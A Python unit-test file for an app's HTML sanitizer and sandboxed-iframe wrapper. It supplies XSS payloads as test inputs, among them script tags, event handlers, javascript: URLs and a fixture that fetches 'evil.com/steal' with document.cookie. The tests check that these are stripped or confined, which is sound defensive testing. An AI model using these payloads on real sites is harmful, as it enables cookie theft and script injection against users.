"""
tests/test_security.py — Security unit tests for the sanitize layer.

Two surfaces under test:

1. render_markdown() — Markdown → HTML via bleach allowlist.
   Acceptance: ALL of these must be stripped/escaped before browser sees them:
     - <script> tags (inline JS)
     - on* event handlers (onerror, onclick, onload, onmouseover, etc.)
     - javascript: URL scheme (in href, src, action)
     - data: URL scheme (XSS via data URIs)
     - <iframe> tags (embedding foreign content)
     - <object>, <embed>, <form> tags
     - HTML comments (potential IE conditional comment attacks)
     - <style> with expression() (CSS-based JS execution in old IE)

2. wrap_html_artifact() — Raw HTML sandboxed in <iframe srcdoc>.
   Acceptance:
     - Output contains sandbox="allow-scripts" but NOT "allow-same-origin"
     - CSP meta tag is injected into the srcdoc content
     - CSP includes connect-src 'none' (no outbound network)
     - <script> tags in the artifact ARE preserved (legitimate use case)
     - <style> tags in the artifact ARE preserved
     - The content is properly escaped for srcdoc attribute embedding

This test file is fully self-contained — no network, no DB, no LLM.
"""
from __future__ import annotations

import os
import sys
import html as html_module

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
os.environ.setdefault("DATABASE_URL", "sqlite+aiosqlite:///./lenny.db")

from app.security.sanitize import render_markdown, wrap_html_artifact


# ═══════════════════════════════════════════════════════════════════════════════
# 1. render_markdown() — bleach allowlist sanitization
# ═══════════════════════════════════════════════════════════════════════════════

class TestRenderMarkdownStripsScripts:
    """<script> tags must be completely stripped."""

    def test_inline_script_stripped(self):
        md = "Hello\n\n<script>alert('xss')</script>\n\nWorld"
        out = render_markdown(md)
        assert "<script" not in out.lower()
        assert "alert" not in out  # content stripped too

    def test_script_with_type_stripped(self):
        md = "<script type='text/javascript'>evil()</script>"
        out = render_markdown(md)
        assert "<script" not in out.lower()

    def test_script_case_insensitive_stripped(self):
        md = "<SCRIPT>alert(1)</SCRIPT>"
        out = render_markdown(md)
        assert "script" not in out.lower()

    def test_script_src_stripped(self):
        md = '<script src="https://evil.com/steal.js"></script>'
        out = render_markdown(md)
        assert "<script" not in out.lower()
        assert "evil.com" not in out


class TestRenderMarkdownStripsEventHandlers:
    """on* event handlers must be stripped from all tags."""

    def test_onerror_on_img_stripped(self):
        md = '<img src="x" onerror="alert(1)">'
        out = render_markdown(md)
        assert "onerror" not in out.lower()

    def test_onclick_stripped(self):
        md = '<a href="#" onclick="steal()">Click me</a>'
        out = render_markdown(md)
        assert "onclick" not in out.lower()

    def test_onload_stripped(self):
        md = '<body onload="evil()">'
        out = render_markdown(md)
        assert "onload" not in out.lower()

    def test_onmouseover_stripped(self):
        md = '<p onmouseover="document.cookie">Hover me</p>'
        out = render_markdown(md)
        assert "onmouseover" not in out.lower()

    def test_onfocus_stripped(self):
        md = '<input onfocus="fetch(\'https://evil.com\')">'
        out = render_markdown(md)
        assert "onfocus" not in out.lower()

    def test_multiple_event_handlers_stripped(self):
        md = '<div onclick="a()" onmouseover="b()" onkeydown="c()">text</div>'
        out = render_markdown(md)
        assert "onclick" not in out.lower()
        assert "onmouseover" not in out.lower()
        assert "onkeydown" not in out.lower()


class TestRenderMarkdownStripsJavascriptUrls:
    """javascript: URL scheme must be stripped from href, src, action."""

    def test_javascript_href_stripped(self):
        md = '[Click](javascript:alert(1))'
        out = render_markdown(md)
        assert "javascript:" not in out.lower()

    def test_javascript_mixed_case_stripped(self):
        md = '[Link](JavaScript:void(0))'
        out = render_markdown(md)
        assert "javascript:" not in out.lower()

    def test_javascript_with_encoding_stripped(self):
        # Some XSS attempts use URL encoding
        md = '[Link](java&#115;cript:alert(1))'
        out = render_markdown(md)
        assert "javascript:" not in out.lower()

    def test_data_uri_img_stripped(self):
        # data: URIs in img src can carry payloads
        md = '<img src="data:text/html,<script>alert(1)</script>">'
        out = render_markdown(md)
        # Either the img is stripped entirely or the data: src is stripped
        assert "data:text/html" not in out.lower()


class TestRenderMarkdownStripsBlockedTags:
    """<iframe>, <object>, <embed>, <form>, <style> must be stripped."""

    def test_iframe_stripped(self):
        md = '<iframe src="https://evil.com" width="0" height="0"></iframe>'
        out = render_markdown(md)
        assert "<iframe" not in out.lower()

    def test_object_tag_stripped(self):
        md = '<object data="malware.swf"></object>'
        out = render_markdown(md)
        assert "<object" not in out.lower()

    def test_embed_stripped(self):
        md = '<embed src="evil.swf">'
        out = render_markdown(md)
        assert "<embed" not in out.lower()

    def test_form_stripped(self):
        md = '<form action="https://evil.com" method="POST"><input name="cookie"></form>'
        out = render_markdown(md)
        assert "<form" not in out.lower()

    def test_style_tag_stripped(self):
        # <style> with expression() was a classic IE XSS vector
        md = '<style>body { background: url("javascript:evil()") }</style>'
        out = render_markdown(md)
        assert "<style" not in out.lower()


class TestRenderMarkdownPreservesLegitimate:
    """Verify allowed content passes through intact."""

    def test_basic_formatting_preserved(self):
        md = "**Bold** and *italic* and `code`"
        out = render_markdown(md)
        assert "<strong>" in out or "<b>" in out
        assert "<em>" in out or "<i>" in out
        assert "<code>" in out

    def test_headings_preserved(self):
        md = "# H1\n## H2\n### H3"
        out = render_markdown(md)
        assert "<h1>" in out
        assert "<h2>" in out
        assert "<h3>" in out

    def test_links_with_http_preserved(self):
        md = "[Lenny's Podcast](https://www.lennyspodcast.com)"
        out = render_markdown(md)
        assert "https://www.lennyspodcast.com" in out
        assert "<a" in out

    def test_unordered_list_preserved(self):
        md = "- Item 1\n- Item 2\n- Item 3"
        out = render_markdown(md)
        assert "<ul>" in out
        assert "<li>" in out

    def test_code_block_preserved(self):
        md = "```python\nprint('hello')\n```"
        out = render_markdown(md)
        assert "<pre>" in out
        assert "<code" in out  # may have class="language-python"
        assert "print" in out

    def test_blockquote_preserved(self):
        md = "> A wise quote from a podcast guest."
        out = render_markdown(md)
        assert "<blockquote>" in out


# ═══════════════════════════════════════════════════════════════════════════════
# 2. wrap_html_artifact() — sandboxed iframe srcdoc
# ═══════════════════════════════════════════════════════════════════════════════

_SAMPLE_HTML = """<!DOCTYPE html>
<html>
<head><title>My Dashboard</title></head>
<body>
<h1>Growth Metrics</h1>
<script>document.write('Dynamic content');</script>
<style>body { background: #111; color: #eee; }</style>
</body>
</html>"""

_MALICIOUS_HTML = """<!DOCTYPE html>
<html>
<head></head>
<body>
<script>
  // Attempt to steal parent cookies
  fetch('https://evil.com/steal?c=' + document.cookie);
  // Attempt to access parent localStorage
  var data = window.parent.localStorage;
</script>
</html>"""


class TestWrapHtmlArtifactSandbox:
    """The iframe wrapper must use sandbox without allow-same-origin."""

    def test_output_contains_iframe(self):
        out = wrap_html_artifact(_SAMPLE_HTML)
        assert "<iframe" in out.lower()

    def test_sandbox_attribute_present(self):
        out = wrap_html_artifact(_SAMPLE_HTML)
        assert 'sandbox=' in out

    def test_sandbox_allows_scripts(self):
        out = wrap_html_artifact(_SAMPLE_HTML)
        assert "allow-scripts" in out

    def test_sandbox_does_not_allow_same_origin(self):
        """
        CRITICAL: allow-same-origin would let the iframe access parent cookies.
        It must NOT be present.
        """
        out = wrap_html_artifact(_SAMPLE_HTML)
        assert "allow-same-origin" not in out

    def test_sandbox_does_not_allow_forms(self):
        out = wrap_html_artifact(_SAMPLE_HTML)
        assert "allow-forms" not in out

    def test_sandbox_does_not_allow_popups(self):
        out = wrap_html_artifact(_SAMPLE_HTML)
        assert "allow-popups" not in out

    def test_uses_srcdoc_not_src(self):
        """Must embed content inline, not load from a URL."""
        out = wrap_html_artifact(_SAMPLE_HTML)
        assert "srcdoc=" in out
        # Should not have a src= attribute pointing to a URL
        import re
        src_url = re.search(r'src="https?://', out)
        assert src_url is None


class TestWrapHtmlArtifactCsp:
    """CSP meta tag must be injected into the srcdoc content."""

    def test_csp_meta_injected(self):
        out = wrap_html_artifact(_SAMPLE_HTML)
        # The CSP meta is in the srcdoc (HTML-escaped inside the attribute)
        assert "Content-Security-Policy" in out

    def test_csp_blocks_connect(self):
        """connect-src 'none' prevents outbound fetch/XHR from the artifact."""
        out = wrap_html_artifact(_SAMPLE_HTML)
        assert "connect-src" in out

    def test_csp_blocks_default_src(self):
        out = wrap_html_artifact(_SAMPLE_HTML)
        assert "default-src" in out

    def test_csp_injected_into_no_head_html(self):
        """CSP should be injected even if the artifact has no <head> tag."""
        minimal = "<body><p>Hello</p></body>"
        out = wrap_html_artifact(minimal)
        assert "Content-Security-Policy" in out


class TestWrapHtmlArtifactPreservesScripts:
    """
    Unlike markdown sanitization, HTML artifacts preserve <script> and <style>
    because isolation happens at the iframe level, not via content stripping.
    """

    def test_script_tag_preserved_in_srcdoc(self):
        out = wrap_html_artifact(_SAMPLE_HTML)
        # The script content should be present (HTML-escaped) in the srcdoc
        assert "Dynamic content" in html_module.unescape(out) or "Dynamic content" in out

    def test_style_tag_preserved_in_srcdoc(self):
        out = wrap_html_artifact(_SAMPLE_HTML)
        # Style content should survive
        unescaped = html_module.unescape(out)
        assert "background" in unescaped or "background" in out

    def test_title_preserved_in_srcdoc(self):
        out = wrap_html_artifact(_SAMPLE_HTML)
        unescaped = html_module.unescape(out)
        assert "My Dashboard" in unescaped

    def test_malicious_fetch_confined_not_stripped(self):
        """
        The malicious script is NOT stripped — it is CONFINED by the sandbox.
        The fetch() call will fail at runtime because:
          1. sandbox without allow-same-origin means no cookie access
          2. CSP connect-src 'none' blocks the outbound fetch
        The content is preserved but its damage is neutralised.
        """
        out = wrap_html_artifact(_MALICIOUS_HTML)
        # The script is still in the srcdoc (confined, not stripped)
        unescaped = html_module.unescape(out)
        assert "fetch" in unescaped or "fetch" in out
        # But the sandbox is in place
        assert "allow-scripts" in out
        assert "allow-same-origin" not in out
        assert "connect-src" in out


class TestSrcdocEscaping:
    """Content must be properly HTML-escaped for the srcdoc attribute."""

    def test_double_quotes_escaped_in_srcdoc(self):
        html_with_quotes = '<div class="test">Content</div>'
        out = wrap_html_artifact(html_with_quotes)
        # The srcdoc attribute value should have quotes escaped
        assert 'srcdoc="' in out  # outer quotes
        # Internal double quotes should be escaped as &quot;
        # (or the content properly embedded)
        assert 'srcdoc="' in out

    def test_special_chars_escaped(self):
        html_with_specials = "<p>Hello & <World> 'quotes'</p>"
        out = wrap_html_artifact(html_with_specials)
        # Should not break the HTML structure
        assert "<iframe" in out
        assert "srcdoc=" in out


if __name__ == "__main__":
    import subprocess, sys
    sys.exit(subprocess.call([sys.executable, "-m", "pytest", __file__, "-v"]))
